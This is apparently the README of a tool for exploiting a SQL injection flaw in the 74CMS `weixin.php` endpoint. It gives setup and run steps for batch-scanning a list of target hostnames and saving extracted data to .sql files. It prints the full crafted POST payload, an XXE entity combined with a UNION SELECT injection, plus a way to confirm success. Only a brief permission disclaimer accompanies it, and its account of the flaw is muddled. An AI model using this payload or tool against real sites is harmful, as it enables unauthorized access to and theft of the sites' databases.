# 74CMS weixin.php - SQL Injection
## Overview
This script is designed to test for SQL injection vulnerabilities in the 74CMS `weixin.php` file. The vulnerability arises due to the lack of customization of the `libxml_disable_entity_loader` function, allowing XML External Entity (XXE) Injection, leading to SQL injection vulnerabilities.

## Details
- **ID**: 74cms-weixin-sqli
- **EXPLOIT Author**: Pushkar Upadhyay
- **Severity**: High

## Usage
1. Clone the repository:

   ```bash
   git clone https://github.com/[your-username]/74cms-weixin-sqli.git
   cd 74cms-weixin-sqli
   ```
2. Create Virtual Environment(Optional but recommended):
   ```bash
   python -m venv venv
   source venv/bin/activate   # On Windows, use 'venv\Scripts\activate'
   ```
3. Install the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```
   Create a file named `hostnames.txt` with the list of target hostnames, one per line.

4. Run the script:
   ```bash
   python sql_injection_script.py
   ```
Check the console for results. If successful, the script will save retrieved data in .sql files.

## HTTP Request
The script sends a crafted HTTP POST request to the weixin.php endpoint with the SQL injection payload.
```http
POST /plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce= HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5({{num}})#</Content></xml>
Vulnerability Verification
```
The script verifies the vulnerability by checking the response for the presence of the MD5 hash generated from the specified number `({{num}})`.

## Important Note
Ensure that you have the necessary permissions to test for vulnerabilities on the target system. Unauthorized testing may have legal consequences.

## License
This project is licensed under the MIT License.
